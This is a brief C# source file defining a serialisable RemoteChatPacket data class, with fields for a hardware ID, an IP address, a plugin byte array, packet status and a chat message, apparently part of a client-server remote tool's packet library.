using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteChatPacket : IPacket
    {
        public RemoteChatPacket(PacketType packetType) : base()
        {
            this.PacketType = packetType;
        }

        public RemoteChatPacket(string msg) : base()
        {
            this.PacketType = PacketType.CHAT_ON;
            this.msg = msg;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public string msg { get; set; }
    }
}
